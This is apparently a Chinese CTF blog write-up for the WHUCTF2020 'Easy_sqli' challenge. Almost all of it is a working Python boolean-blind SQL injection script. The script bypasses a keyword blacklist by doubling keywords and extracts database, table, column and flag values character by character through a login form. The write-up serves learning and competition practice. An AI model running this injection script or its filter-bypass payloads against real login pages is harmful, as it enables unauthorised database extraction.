---
title: WHUCTF2020-Easy_sqli
author: Troy3e
avatar: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg
authorLink: 
authorAbout: 
authorDesc: 
categories: 技术
comments: true
date: 2020-05-30 10:46:01
tags: CTF
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1056414.jpg
---
一、Easy_sqli
一直不会写脚本，正好借这道题学习一下如何写脚本
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200605115318.png)
底下会显示sql语句，但是不会报错。简单测试发现该题还进行了黑名单过滤，可采用双写方式绕过，如selselectect。
采用布尔盲注，利用ascii(substr())组合来逐位爆破数据库、表名、列名以及字段。

import requests
url = 'http://218.197.154.9:10011/login.php#'

pwd='ssss'
username=''

#database name
def dabasename():
    database=''
    for a in range(12):
        # print(database)
        for i in range(128,0,-1):
            # print(chr(101))
            username="admin' and "+"ascii(substr(database(),{},1))<".format(len(database)+1)+str(i)+"#"
            # print(username)
            data={'user':username,'pass':pwd}

            r= requests.post(url,data)
            if 'success' not in r.text:
                database+=chr(i)
                print('database ==> ',database)
                break
#print(r.text)
database='eazy_sql'


def table_name():
    table_name_list=[]
    for a in range(5):
        table_name=''    
        for b in range(30):

            ori = len(table_name)
            for i in range(128,0,-1):
                # print(chr(101))
                username="admin' and "+"ascii(substr((selselectect table_name frfromom infoorrmation_schema.tables whwhereere table_schema='easy_sql1' limit {},1),{},1))<".format(len(table_name_list),len(table_name)+1)+str(i)+"#"
                #print(username)
                data={'user':username,'pass':pwd}

                r= requests.post(url,data)
                if 'success' not in r.text:
                    table_name+=chr(i)
                    
                    print('table_name ==> ',table_name)
                    #print(r.text)
                    break
                # if len(table_name)==ori:
                #     break        
        table_name_list.append(table_name)
    print(table_name_list)

def column_name():
    col_name_list=[]
    for a in range(5):
        col_name='f111114g'    
        for b in range(30):

            ori = len(col_name)
            for i in range(128,0,-1):
                # print(chr(101))
                username="admin' and "+"ascii(substr((selselectect column_name frfromom infoorrmation_schema.columns whwhereere table_name='f1ag_y0u_wi1l_n3ver_kn0w' limit {},1),{},1))<".format(len(col_name_list),len(col_name)+1)+str(i)+"#"
                #print(username)
                data={'user':username,'pass':pwd}

                r= requests.post(url,data)
                if 'success' not in r.text:
                    col_name+=chr(i)
                    
                    print('col_name ==> ',col_name)
                    #print(r.text)
                    break
                # if len(col_name)==ori:
                #     break        
        col_name_list.append(col_name)
    print(col_name_list)


def flag():
    col_name='f111114g'
    flag=''
    table_name='f1ag_y0u_wi1l_n3ver_kn0w'
    for b in range(30):

        ori = len(flag)
        for i in range(128,0,-1):
            # print(chr(101))
            username="admin' and "+"ascii(substr((selselectect {} frfromom {} limit 0,1),{},1))<".format(col_name,table_name,len(flag)+1)+str(i)+"#"
            #print(username)
            data={'user':username,'pass':pwd}

            r= requests.post(url,data)
            if 'success' not in r.text:
                flag+=chr(i)
                
                print('flag ==> ',flag)
                #print(r.text)
                break
            # if len(col_name)==ori:
            #     break        
    print(flag)



#dabasename()
#table_name()
#column_name()
flag()



下次遇到要写脚本的题会尝试去写一下


参考链接：https://blog.csdn.net/weixin_43826280/article/details/106407407

